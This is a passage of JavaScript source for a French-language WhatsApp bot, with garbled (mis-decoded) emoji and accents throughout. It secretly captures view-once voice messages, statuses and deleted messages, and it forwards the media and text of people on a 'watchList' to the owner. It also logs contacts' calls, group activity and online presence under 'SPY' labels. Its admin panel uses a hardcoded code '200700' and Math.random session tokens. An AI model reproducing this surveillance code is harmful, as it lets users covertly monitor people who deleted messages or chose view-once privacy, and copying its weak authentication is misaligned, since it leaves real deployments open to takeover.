            { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
          );
          
          if (stream && stream.length > 0) {
            // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
            const contactInfo = getContactInfo(sender);
            const caption = `ðŸŽ¤ *VOCAL Ã‰COUTE UNIQUE INTERCEPTÃ‰!*\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\nðŸ‘¤ *Contact:* ${contactInfo}\nðŸ“ *Nom WA:* ${msg.pushName || "Inconnu"}\nðŸ’¬ *Chat:* ${from.endsWith("@g.us") ? "Groupe" : "PrivÃ©"}\nðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}`;
            
            // Envoyer le vocal comme PTT (message vocal)
            await hani.sendMessage(botNumber, { 
              audio: stream, 
              mimetype: voiceMsg?.mimetype || "audio/ogg; codecs=opus",
              ptt: true // Toujours en format vocal
            });
            
            // Puis envoyer le caption
            await hani.sendMessage(botNumber, { text: caption });
            
            console.log(`[OK] Vocal Ã©coute unique envoyÃ© Ã  Moi-mÃªme`);
          }
        } catch (e) {
          console.log(`[!] Erreur sauvegarde vocal Ã©coute unique: ${e.message}`);
        }
      }

      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      // ðŸ“¸ INTERCEPTER ET SAUVEGARDER LES STATUTS AUTOMATIQUEMENT
      // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
      if (from === "status@broadcast" && !msg.key.fromMe && protectionState.antideletestatus) {
        const statusType = getContentType(msg.message);
        
        // TÃ©lÃ©charger et sauvegarder le statut immÃ©diatement
        try {
          const statusData = {
            id: msg.key.id,
            sender: sender,
            pushName: msg.pushName || "Inconnu",
            type: statusType?.replace("Message", "") || "inconnu",
            date: new Date().toLocaleString("fr-FR"),
            timestamp: Date.now(),
            message: msg
          };
          
          // Sauvegarder dans le store
          statusStore.set(msg.key.id, statusData);
          
          // Limiter la taille
          if (statusStore.size > MAX_STORED_STATUSES) {
            statusStore.delete(statusStore.keys().next().value);
          }
          
          // TÃ©lÃ©charger le mÃ©dia si c'est une image/vidÃ©o
          if (["imageMessage", "videoMessage", "audioMessage"].includes(statusType)) {
            const stream = await downloadMediaMessage(
              msg,
              "buffer",
              {},
              { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
            );
            
            // Sauvegarder le buffer
            statusData.mediaBuffer = stream;
            statusData.caption = msg.message[statusType]?.caption || "";
            
            console.log(`ðŸ“¸ Statut sauvegardÃ© de ${msg.pushName || sender.split("@")[0]} (${statusType})`);
          } else if (statusType === "extendedTextMessage") {
            statusData.text = msg.message.extendedTextMessage?.text || "";
            console.log(`[NOTE] Statut texte sauvegardÃ© de ${msg.pushName || sender.split("@")[0]}`);
          }
          
        } catch (e) {
          console.log(`[!] Erreur sauvegarde statut: ${e.message}`);
        }
      }

      // Stocker pour anti-delete
      if (!msg.key.fromMe && msg.message) {
        // Extraire le vrai numÃ©ro de l'expÃ©diteur
        const realSender = msg.key.participant || msg.key.remoteJid;
        const realNumber = realSender?.split("@")[0] || "";
        
        // Cacher le nom dans le cache des contacts
        if (msg.pushName && msg.pushName.length > 1) {
          cacheContactName(realSender, msg.pushName);
        }
        
        // RÃ©cupÃ©rer le nom: pushName > cache > numÃ©ro formatÃ©
        let realName = msg.pushName && msg.pushName.length > 1 ? msg.pushName : null;
        if (!realName) realName = getCachedContactName(realSender);
        if (!realName && isValidPhoneNumber(realNumber)) realName = formatPhoneNumber(realNumber);
        if (!realName) realName = "Inconnu";
        
        // Ne stocker que si le numÃ©ro est valide (pas un ID de groupe corrompu)
        if (isValidPhoneNumber(realNumber)) {
          messageStore.set(msg.key.id, {
            key: msg.key,
            message: msg.message,
            sender: msg.key.remoteJid,
            participant: msg.key.participant,
            realSender: realSender,
            realNumber: realNumber,
            pushName: realName,
            timestamp: new Date(),
            type: getContentType(msg.message),
            text: getMessageText(msg)
          });
          
          if (messageStore.size > MAX_STORED_MESSAGES) {
            messageStore.delete(messageStore.keys().next().value);
          }
        }
        
        // ðŸ•µï¸ TRACKER L'ACTIVITÃ‰
        const senderJid = msg.key.participant || msg.key.remoteJid;
        const isGroup = from?.endsWith("@g.us");
        trackActivity(senderJid, msg.pushName, getContentType(msg.message), isGroup ? from : null);
        
        // ðŸ•µï¸ VÃ‰RIFIER SI LA PERSONNE EST SURVEILLÃ‰E
        const senderNum = senderJid?.split("@")[0];
        
        // VÃ©rifier dans la watchList (plusieurs formats possibles)
        let isWatched = false;
        let matchedNumber = null;
        
        for (const watchedNum of watchList) {
          // VÃ©rification exacte ou partielle (fin du numÃ©ro)
          if (senderNum === watchedNum || 
              senderNum?.endsWith(watchedNum) || 
              watchedNum?.endsWith(senderNum) ||
              senderNum?.includes(watchedNum) ||
              watchedNum?.includes(senderNum)) {
            isWatched = true;
            matchedNumber = watchedNum;
            break;
          }
        }
        
        if (isWatched) {
          console.log(`[SPY] ALERTE! Message de ${senderNum} (surveillÃ©: ${matchedNumber})`);
          
          const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
          const watchedName = msg.pushName && msg.pushName.length > 1 ? msg.pushName : "Inconnu";
          
          // ðŸ“¸ INTERCEPTER AUTOMATIQUEMENT LES MÃ‰DIAS DES SURVEILLÃ‰S
          const msgType = getContentType(msg.message);
          if (["imageMessage", "videoMessage", "audioMessage", "documentMessage"].includes(msgType)) {
            try {
              const stream = await downloadMediaMessage(
                msg,
                "buffer",
                {},
                { logger: pino({ level: "silent" }), reuploadRequest: hani.updateMediaMessage }
              );
              
              const mediaContent = msg.message[msgType];
              // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
              const contactInfo = getContactInfo(senderJid);
              let caption = `ðŸ•µï¸ *MÃ‰DIA INTERCEPTÃ‰*\n`;
              caption += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
              caption += `ðŸ‘¤ *Contact:* ${contactInfo}\n`;
              caption += `ðŸ“ *Nom WA:* ${watchedName}\n`;
              caption += `ðŸ’¬ *Vers:* ${isGroup ? "Groupe " + from.split("@")[0] : "Chat privÃ©"}\n`;
              caption += `ðŸ“ *Type:* ${msgType.replace("Message", "")}\n`;
              caption += `ðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}\n`;
              caption += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
              if (mediaContent?.caption) {
                caption += `\nðŸ’¬ *LÃ©gende:* "${mediaContent.caption}"`;
              }
              
              if (msgType === "imageMessage") {
                await hani.sendMessage(botNumber, { image: stream, caption });
              } else if (msgType === "videoMessage") {
                await hani.sendMessage(botNumber, { video: stream, caption });
              } else if (msgType === "audioMessage") {
                await hani.sendMessage(botNumber, { text: caption });
                await hani.sendMessage(botNumber, { audio: stream, mimetype: "audio/mp4", ptt: true });
              } else if (msgType === "documentMessage") {
                await hani.sendMessage(botNumber, { 
                  document: stream, 
                  fileName: mediaContent?.fileName || "document",
                  caption 
                });
              }
              
              console.log(`[SPY] MÃ©dia interceptÃ© de ${watchedName} (${msgType})`);
            } catch (e) {
              console.log(`[!] Erreur interception mÃ©dia: ${e.message}`);
            }
          } else {
            // Alerter pour les messages texte
            // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
            const contactInfo = getContactInfo(senderJid);
            let alertText = `ðŸ•µï¸ *ALERTE SURVEILLANCE*\n`;
            alertText += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
            alertText += `ðŸ‘¤ *Contact:* ${contactInfo}\n`;
            alertText += `ðŸ“ *Nom WA:* ${watchedName}\n`;
            alertText += `ðŸ’¬ *Chat:* ${isGroup ? "Groupe" : "Message privÃ©"}\n`;
            if (isGroup) {
              alertText += `ðŸ˜ï¸ *Groupe:* ${from.split("@")[0]}\n`;
            }
            alertText += `ðŸ“ *Type:* ${getContentType(msg.message)?.replace("Message", "")}\n`;
            alertText += `ðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}\n`;
            alertText += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
            if (getMessageText(msg)) {
              alertText += `\nðŸ“„ *Contenu:*\n"${getMessageText(msg).substring(0, 200)}"`;
            }
            await hani.sendMessage(botNumber, { text: alertText });
          }
        }
        
        // ðŸ“ STOCKER LES MÃ‰DIAS REÃ‡US POUR EXTRACTION
        const msgType = getContentType(msg.message);
        if (["imageMessage", "videoMessage", "audioMessage", "documentMessage"].includes(msgType)) {
          try {
            const senderForMedia = senderJid?.split("@")[0];
            if (!mediaStore.has(senderForMedia)) {
              mediaStore.set(senderForMedia, []);
            }
            
            const userMedia = mediaStore.get(senderForMedia);
            userMedia.push({
              id: msg.key.id,
              type: msgType.replace("Message", ""),
              key: msg.key,
              message: msg.message,
              pushName: realName,
              date: new Date().toLocaleString("fr-FR"),
              caption: msg.message[msgType]?.caption || "",
              fileName: msg.message[msgType]?.fileName || ""
            });
            
            // Garder seulement les MAX derniers
            if (userMedia.length > MAX_MEDIA_PER_USER) {
              userMedia.shift();
            }
            
            console.log(`ðŸ“ MÃ©dia stockÃ© de ${senderForMedia} (${msgType})`);
          } catch (e) {}
        }
      }

      // XP et niveau
      if (!msg.key.fromMe) {
        const result = db.addXP(sender, 5);
        if (result.levelUp) {
          const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
          await hani.sendMessage(botNumber, { 
            text: `ðŸŽ‰ *Level Up!*\n\n@${sender.split("@")[0]} est maintenant niveau ${result.newLevel}!`,
            mentions: [sender]
          });
        }
      }

      // Stats
      db.incrementStats("messages");

      // Commandes
      await handleCommand(hani, msg, db);
      
    } catch (e) {
      console.log("âš ï¸ Erreur message:", e.message);
    }
  });

  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ANTI-DELETE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  const processedDeletedMsgs = new Set(); // Anti-doublon pour messages supprimÃ©s
  hani.ev.on("messages.update", async (updates) => {
    if (!protectionState.antidelete) return;
    
    for (const update of updates) {
      if (update.update?.messageStubType === 1 || update.update?.message === null) {
        // ðŸ”’ ANTI-DOUBLON
        const msgId = update.key?.id;
        if (processedDeletedMsgs.has(msgId)) continue;
        processedDeletedMsgs.add(msgId);
        if (processedDeletedMsgs.size > 500) {
          const iter = processedDeletedMsgs.values();
          for (let i = 0; i < 100; i++) processedDeletedMsgs.delete(iter.next().value);
        }
        
        const storedMsg = messageStore.get(update.key?.id);
        
        if (storedMsg) {
          // RÃ©cupÃ©rer les infos avec validation
          const senderNumber = storedMsg.realNumber || "";
          
          // Ignorer si le numÃ©ro n'est pas valide
          if (!isValidPhoneNumber(senderNumber)) {
            console.log(`[!] Message supprimÃ© ignorÃ©: numÃ©ro invalide (${senderNumber})`);
            continue;
          }
          
          // RÃ©cupÃ©rer le nom: base de contacts > stockÃ© > formatÃ©
          let senderName = null;
          const contactInfo = getContact(senderNumber);
          if (contactInfo && contactInfo.name !== "Inconnu") {
            senderName = contactInfo.name;
          }
          if (!senderName) senderName = storedMsg.pushName;
          if (!senderName || senderName === "Inconnu") {
            senderName = formatPhoneNumber(senderNumber);
          }
          
          console.log(`[DEL] Message supprimÃ© de ${senderName} (${senderNumber})`);
          
          deletedMessages.push({
            sender: senderName,
            number: senderNumber,
            chat: storedMsg.sender,
            type: storedMsg.type?.replace("Message", "") || "texte",
            text: storedMsg.text,
            date: new Date().toLocaleString("fr-FR"),
            originalMessage: storedMsg
          });
          
          if (deletedMessages.length > MAX_DELETED_MESSAGES) {
            deletedMessages.shift();
          }
          
          try {
            const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
            if (botNumber) {
              const chatJid = storedMsg.sender || storedMsg.key?.remoteJid;
              const isGroupChat = chatJid?.endsWith("@g.us");
              
              // Format numÃ©ro: +225 XX XX XX XX XX
              const formattedNumber = formatPhoneNumber(senderNumber);
              
              // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
              const contactInfo = getContactInfo(storedMsg.sender);
              let text = `ðŸ—‘ï¸ *MESSAGE SUPPRIMÃ‰ DÃ‰TECTÃ‰*\n`;
              text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n`;
              text += `ðŸ‘¤ *Contact:* ${contactInfo}\n`;
              text += `ðŸ“ *Nom WA:* ${senderName}\n`;
              text += `ðŸ’¬ *Chat:* ${isGroupChat ? "Groupe" : "PrivÃ©"}\n`;
              if (isGroupChat) {
                text += `ðŸ˜ï¸ *Groupe:* ${chatJid?.split("@")[0]}\n`;
              }
              text += `ðŸ“ *Type:* ${storedMsg.type?.replace("Message", "") || "texte"}\n`;
              text += `ðŸ• *Heure:* ${new Date().toLocaleString("fr-FR")}\n`;
              text += `â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n`;
              if (storedMsg.text) {
                text += `\nðŸ“„ *Contenu:*\n"${storedMsg.text}"`;
              }
              
              await hani.sendMessage(botNumber, { text });
              
              // Renvoyer le mÃ©dia si applicable
              if (["imageMessage", "videoMessage", "audioMessage"].includes(storedMsg.type)) {
                try {
                  const stream = await downloadMediaMessage(
                    { message: storedMsg.message, key: storedMsg.key },
                    "buffer",
                    {},
                    { logger: pino({ level: "silent" }) }
                  );
                  
                  const mediaCaption = `ðŸ—‘ï¸ *MÃ©dia supprimÃ©*\nðŸ‘¤ ${contactInfo}\nðŸ“ ${senderName}`;
                  
                  if (storedMsg.type === "imageMessage") {
                    await hani.sendMessage(botNumber, { image: stream, caption: mediaCaption });
                  } else if (storedMsg.type === "videoMessage") {
                    await hani.sendMessage(botNumber, { video: stream, caption: mediaCaption });
                  } else if (storedMsg.type === "audioMessage") {
                    await hani.sendMessage(botNumber, { audio: stream, mimetype: "audio/mp4" });
                  }
                } catch (e) {}
              }
            }
          } catch (e) {}
        }
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // ðŸ“¸ DÃ‰TECTER LES STATUTS SUPPRIMÃ‰S
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        const storedStatus = statusStore.get(update.key?.id);
        if (storedStatus && protectionState.antideletestatus) {
          console.log(`ðŸ“¸ Statut supprimÃ© dÃ©tectÃ© de ${storedStatus.pushName}`);
          
          // Ajouter aux statuts supprimÃ©s
          deletedStatuses.push({
            ...storedStatus,
            deletedAt: new Date().toLocaleString("fr-FR")
          });
          
          if (deletedStatuses.length > MAX_DELETED_STATUSES) {
            deletedStatuses.shift();
          }
          
          // Envoyer le statut supprimÃ© Ã  soi-mÃªme
          try {
            const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
            if (botNumber) {
              const formattedStatusNumber = formatPhoneNumber(storedStatus.sender);
              
              // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
              const contactInfoStatus = getContactInfo(storedStatus.sender);
              let caption = `ðŸ“¸ *Statut supprimÃ©!*\n\n`;
              caption += `ðŸ‘¤ Contact: ${contactInfoStatus}\n`;
              caption += `ðŸ“ Nom WA: ${storedStatus.pushName}\n`;
              caption += `ðŸ“ Type: ${storedStatus.type}\n`;
              caption += `ðŸ• PostÃ©: ${storedStatus.date}\n`;
              caption += `ðŸ—‘ï¸ SupprimÃ©: ${new Date().toLocaleString("fr-FR")}`;
              
              if (storedStatus.mediaBuffer) {
                if (storedStatus.type === "image") {
                  await hani.sendMessage(botNumber, { 
                    image: storedStatus.mediaBuffer, 
                    caption: caption + (storedStatus.caption ? `\n\nðŸ’¬ "${storedStatus.caption}"` : "")
                  });
                } else if (storedStatus.type === "video") {
                  await hani.sendMessage(botNumber, { 
                    video: storedStatus.mediaBuffer, 
                    caption: caption + (storedStatus.caption ? `\n\nðŸ’¬ "${storedStatus.caption}"` : "")
                  });
                } else if (storedStatus.type === "audio") {
                  await hani.sendMessage(botNumber, { text: caption });
                  await hani.sendMessage(botNumber, { audio: storedStatus.mediaBuffer, mimetype: "audio/mp4" });
                }
              } else if (storedStatus.text) {
                caption += `\n\nðŸ’¬ Contenu:\n"${storedStatus.text}"`;
                await hani.sendMessage(botNumber, { text: caption });
              } else {
                await hani.sendMessage(botNumber, { text: caption });
              }
              
              console.log(`[OK] Statut supprimÃ© envoyÃ© Ã  toi-mÃªme`);
            }
          } catch (e) {
            console.log(`[!] Erreur envoi statut supprimÃ©: ${e.message}`);
          }
        }
      }
    }
  });

  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ANTI-CALL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  hani.ev.on("call", async (calls) => {
    for (const call of calls || []) {
      // ðŸ†• ENREGISTRER L'APPEL DANS L'HISTORIQUE
      if (spyConfig.trackCalls) {
        try {
          const callerJid = call.from;
          const callerNumber = callerJid?.split("@")[0] || "";
          let callerName = "Inconnu";
          
          try {
            const contact = await hani.onWhatsApp(callerJid);
            if (contact && contact[0]) {
              callerName = contact[0].notify || contact[0].name || callerNumber;
            }
          } catch (e) {}
          
          const callEntry = {
            jid: callerJid,
            name: callerName,
            type: call.isVideo ? 'video' : 'audio',
            direction: 'in',
            status: call.status === 'offer' ? 'incoming' : call.status,
            timestamp: Date.now()
          };
          
          // Ajouter Ã  l'historique
          if (!spyData.callHistory) spyData.callHistory = [];
          spyData.callHistory.unshift(callEntry);
          if (spyData.callHistory.length > 100) spyData.callHistory.pop();
          
          console.log(`ðŸ“ž [CALL SPY] ${call.isVideo ? 'VidÃ©o' : 'Audio'} de ${callerName} (${callerNumber})`);
        } catch (e) {
          console.log(`[!] Erreur enregistrement appel: ${e.message}`);
        }
      }
      
      // ANTI-CALL: Rejeter UNIQUEMENT si mode invisible est activÃ©
      const shouldRejectCall = spyConfig.ghostMode && call.status === "offer";
      if (shouldRejectCall) {
        try {
          // Rejeter l'appel
          await hani.rejectCall(call.id, call.from);
          
          // Mettre Ã  jour le statut dans l'historique
          if (spyData.callHistory && spyData.callHistory.length > 0) {
            spyData.callHistory[0].status = 'rejected';
          }
          
          // Envoyer un message personnalisÃ© Ã  la personne qui appelle
          const callerNumber = call.from?.split("@")[0] || "";
          const callType = call.isVideo ? "vidÃ©o" : "vocal";
          
          const message = `ðŸ“µ *Appel ${callType} refusÃ©*
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

ðŸ‘‹ Salut!

Je ne suis pas disponible pour les appels pour le moment.

ðŸ“© *Envoie-moi plutÃ´t un message*, je te rÃ©pondrai dÃ¨s que possible!

_Ce message a Ã©tÃ© envoyÃ© automatiquement._`;
          
          await hani.sendMessage(call.from, { text: message });
          
          // Notifier le propriÃ©taire dans "Moi-mÃªme"
          const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
          // ðŸ†• Utiliser getContactInfo pour nom + numÃ©ro
          const contactInfo = getContactInfo(call.from);
          const notif = `ðŸ“µ *Appel ${callType} rejetÃ©*\n\nðŸ‘¤ Contact: ${contactInfo}\nðŸ“ Nom WA: ${callerName}\nðŸ• ${new Date().toLocaleString("fr-FR")}`;
          await hani.sendMessage(botNumber, { text: notif });
          
          console.log(`ðŸ“µ Appel ${callType} rejetÃ© de ${callerName}`);
        } catch (e) {
          console.log(`[!] Erreur anti-call: ${e.message}`);
        }
      }
    }
  });

  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ†• SURVEILLANCE DES GROUPES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  hani.ev.on("group-participants.update", async (update) => {
    if (!spyConfig.trackGroups) return;
    
    try {
      const { id: groupJid, participants, action } = update;
      
      // RÃ©cupÃ©rer les infos du groupe
      let groupName = "Groupe inconnu";
      try {
        const metadata = await hani.groupMetadata(groupJid);
        groupName = metadata?.subject || groupName;
      } catch (e) {}
      
      for (const participant of participants) {
        let participantName = "Inconnu";
        try {
          const contact = await hani.onWhatsApp(participant);
          if (contact && contact[0]) {
            participantName = contact[0].notify || contact[0].name || participant.split("@")[0];
          }
        } catch (e) {}
        
        const activity = {
          groupJid,
          groupName,
          action,
          participant,
          participantName,
          timestamp: Date.now()
        };
        
        // Ajouter Ã  l'historique
        if (!spyData.groupActivity) spyData.groupActivity = [];
        spyData.groupActivity.unshift(activity);
        if (spyData.groupActivity.length > 200) spyData.groupActivity.pop();
        
        // Log uniquement (pas de notification dans Moi-mÃªme)
        let emoji, actionText;
        switch (action) {
          case 'add': emoji = 'âž•'; actionText = 'a rejoint'; break;
          case 'remove': emoji = 'âž–'; actionText = 'a quittÃ©'; break;
          case 'promote': emoji = 'ðŸ‘‘'; actionText = 'promu admin'; break;
          case 'demote': emoji = 'ðŸ‘¤'; actionText = 'rÃ©trogradÃ©'; break;
          default: emoji = 'ðŸ“‹'; actionText = action;
        }
        
        console.log(`ðŸ‘¥ [GROUP SPY] ${participantName} ${actionText} dans ${groupName}`);
      }
    } catch (e) {
      console.log(`[!] Erreur surveillance groupe: ${e.message}`);
    }
  });

  // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ðŸ†• TRACKER DE PRÃ‰SENCE (CONNEXION/DÃ‰CONNEXION) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  hani.ev.on("presence.update", async (update) => {
    if (!spyConfig.trackLastSeen) return;
    
    try {
      const { id: jid, presences } = update;
      if (!presences) return;
      
      for (const [participantJid, presence] of Object.entries(presences)) {
        const cleanJid = participantJid.split("@")[0];
        
        // Ignorer le bot lui-mÃªme
        const botNumber = hani.user?.id?.split(":")[0];
        if (cleanJid === botNumber) continue;
        
        // RÃ©cupÃ©rer le nom
        let name = "Inconnu";
        try {
          const contact = await hani.onWhatsApp(participantJid);
          if (contact && contact[0]) {
            name = contact[0].notify || contact[0].name || cleanJid;
          }
        } catch (e) {}
        
        // Initialiser si nÃ©cessaire
        if (!spyData.lastSeen) spyData.lastSeen = {};
        if (!spyData.lastSeen[participantJid]) {
          spyData.lastSeen[participantJid] = { name };
        }
        
        // Mettre Ã  jour selon le type de prÃ©sence
        if (presence.lastKnownPresence === "available" || presence.lastKnownPresence === "composing" || presence.lastKnownPresence === "recording") {
          spyData.lastSeen[participantJid].lastOnline = Date.now();
          spyData.lastSeen[participantJid].isOnline = true;
          spyData.lastSeen[participantJid].name = name;
        } else if (presence.lastKnownPresence === "unavailable") {
          spyData.lastSeen[participantJid].lastOffline = Date.now();
          spyData.lastSeen[participantJid].isOnline = false;
          spyData.lastSeen[participantJid].name = name;
        }
      }
    } catch (e) {
      // Silencieux
    }
  });

  return hani;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸŒ SERVEUR WEB AVEC QR CODE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const express = require("express");
const app = express();
const port = process.env.PORT || 3000;

// Middleware pour JSON et formulaires
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ðŸ” SYSTÃˆME D'AUTHENTIFICATION ADMIN SÃ‰CURISÃ‰
const ADMIN_CODE = "200700";
const adminSessions = new Map(); // Sessions actives

// GÃ©nÃ©rer un token de session
function generateSessionToken() {
  return Math.random().toString(36).substring(2) + Date.now().toString(36) + Math.random().toString(36).substring(2);
}

// VÃ©rifier si une session est valide
function isValidSession(token) {
  if (!token || !adminSessions.has(token)) return false;
  const session = adminSessions.get(token);
  // Session expire aprÃ¨s 1 heure
  if (Date.now() - session.createdAt > 3600000) {
    adminSessions.delete(token);
    return false;
  }
  return true;
}

// Route de login admin
app.post("/admin/login", (req, res) => {
  const { code } = req.body;
  if (code === ADMIN_CODE) {
    const token = generateSessionToken();
    adminSessions.set(token, { createdAt: Date.now(), ip: req.ip });
    console.log(`[ADMIN] ðŸ”“ Connexion admin rÃ©ussie depuis ${req.ip}`);
    res.json({ success: true, token });
  } else {
    console.log(`[ADMIN] âŒ Tentative de connexion Ã©chouÃ©e depuis ${req.ip}`);
    res.json({ success: false, message: "Code incorrect" });
  }
});

// Route de logout
app.post("/admin/logout", (req, res) => {
  const token = req.headers['x-admin-token'];
  if (token) adminSessions.delete(token);
  res.json({ success: true });
});

// API pour vÃ©rifier l'Ã©tat admin
app.get("/api/admin/check", (req, res) => {
  const token = req.headers['x-admin-token'];
  res.json({ valid: isValidSession(token) });
});

// API pour les stats admin (protÃ©gÃ©e)
app.get("/api/admin/stats", async (req, res) => {
  const token = req.headers['x-admin-token'];
  console.log('[ADMIN API] /stats - Token:', token ? 'prÃ©sent' : 'absent');
  
  if (!isValidSession(token)) {
    console.log('[ADMIN API] /stats - Session invalide');
    return res.status(401).json({ error: "Non autorisÃ©" });
  }
  
  try {
    console.log('[ADMIN API] /stats - Chargement des donnÃ©es...');
    const users = db.data.users || {};
    const userList = Object.entries(users);
    const banned = db.data.banned || [];
    const limited = db.data.limitedUsers || {};
    
    let mysqlStats = null;
    if (mysqlDB.isConnected()) {
      mysqlStats = await mysqlDB.getDashboardStats();
    }
    
    res.json({
      success: true,
      local: {
        totalUsers: userList.length,
        owners: userList.filter(([_, u]) => u.role === "owner").length,
        sudos: userList.filter(([_, u]) => u.role === "sudo").length,
        approved: userList.filter(([_, u]) => u.role === "approved").length,
        banned: banned.length,
        limited: Object.keys(limited).length,
        messages: db.data.stats?.messages || 0,
        commands: db.data.stats?.commands || 0,
        users: userList.map(([jid, user]) => ({
          jid: jid,
          number: jid.split("@")[0],
          name: user.name || "Inconnu",
          role: user.role || "user",
          messages: user.messageCount || 0,
          isBanned: banned.includes(jid),
          isLimited: !!limited[jid],
          limitations: limited[jid] || null,
          lastSeen: user.lastSeen || null,
          isBot: user.isBot || false
        }))
      },
      mysql: {
        connected: mysqlDB.isConnected(),
        stats: mysqlStats
      },
      bot: {
        connected: qrState.isConnected,
        status: qrState.connectionStatus,
        info: qrState.botInfo
      },
      uptime: process.uptime(),
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ðŸš« API pour BANNIR un utilisateur
app.post("/api/admin/ban", (req, res) => {
  try {
    const token = req.headers['x-admin-token'];
    if (!isValidSession(token)) {
      return res.status(401).json({ error: "Non autorisÃ©" });
    }
    
    const { jid } = req.body;
    if (!jid) return res.status(400).json({ error: "JID requis" });
    
    if (!db.data.banned) db.data.banned = [];
    
    if (!db.data.banned.includes(jid)) {
      db.data.banned.push(jid);
      db.save();
      console.log(`[ADMIN] ðŸš« Utilisateur banni: ${jid}`);
    }
    
    res.json({ success: true, message: `${jid} a Ã©tÃ© banni` });
  } catch (error) {
    console.error("[ADMIN ERROR] Ban:", error.message);
    res.status(500).json({ error: "Erreur serveur: " + error.message });
  }
});

// âœ… API pour DÃ‰BANNIR un utilisateur
app.post("/api/admin/unban", (req, res) => {
  try {
    const token = req.headers['x-admin-token'];
    if (!isValidSession(token)) {
      return res.status(401).json({ error: "Non autorisÃ©" });
    }
    
    const { jid } = req.body;
    if (!jid) return res.status(400).json({ error: "JID requis" });
    
    if (!db.data.banned) db.data.banned = [];
    
    const index = db.data.banned.indexOf(jid);
    if (index > -1) {
      db.data.banned.splice(index, 1);
      db.save();
      console.log(`[ADMIN] âœ… Utilisateur dÃ©banni: ${jid}`);
    }
    
    res.json({ success: true, message: `${jid} a Ã©tÃ© dÃ©banni` });
  } catch (error) {
    console.error("[ADMIN ERROR] Unban:", error.message);
    res.status(500).json({ error: "Erreur serveur: " + error.message });
  }
});

// âš ï¸ API pour LIMITER un utilisateur (restreindre commandes)
app.post("/api/admin/limit", (req, res) => {
  try {
    const token = req.headers['x-admin-token'];
    if (!isValidSession(token)) {
      return res.status(401).json({ error: "Non autorisÃ©" });
    }
    
    const { jid, level } = req.body;
    if (!jid) return res.status(400).json({ error: "JID requis" });
    
    if (!db.data.limitedUsers) db.data.limitedUsers = {};
    
    // Niveaux de limitation:
    // 1 = Basique (menu, help seulement)
    // 2 = Moyen (pas de tÃ©lÃ©chargement, pas d'IA)
    // 3 = Strict (commandes fun seulement)
    
    db.data.limitedUsers[jid] = {
      level: level || 1,
      blockedCommands: getBlockedCommands(level || 1),
      limitedAt: new Date().toISOString()
    };
    db.save();
    
    console.log(`[ADMIN] âš ï¸ Utilisateur limitÃ© (niveau ${level}): ${jid}`);
    res.json({ success: true, message: `${jid} limitÃ© au niveau ${level}` });
  } catch (error) {
    console.error("[ADMIN ERROR] Limit:", error.message);
    res.status(500).json({ error: "Erreur serveur: " + error.message });
  }
});

// Fonction pour obtenir les commandes bloquÃ©es par niveau
function getBlockedCommands(level) {
  const levels = {
    1: ['owner', 'sudo', 'ban', 'unban', 'setowner', 'restart', 'eval', 'exec'],
    2: ['owner', 'sudo', 'ban', 'unban', 'setowner', 'restart', 'eval', 'exec', 
